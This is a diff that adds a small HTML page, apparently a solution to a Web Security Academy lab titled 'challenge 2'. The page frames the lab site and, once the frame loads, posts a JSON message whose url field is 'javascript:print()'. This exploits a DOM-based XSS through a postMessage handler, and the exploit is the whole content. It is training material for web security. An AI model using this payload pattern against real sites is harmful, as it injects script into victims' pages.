@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>challenge 2</title>
+</head>
+<body>
+    <iframe id="test" src="https://0ac9003704bae37d849b658000b20014.web-security-academy.net/" frameborder="0"></iframe>
+    <script>
+        const frame = document.querySelector("#test");
+        const payload = {
+            type : "load-channel",
+            url : "javascript:print()"
+        };
+        frame.onload = () => {
+            frame.contentWindow.postMessage(JSON.stringify(payload), '*');
+        };
+    </script>
+</body>
+</html>
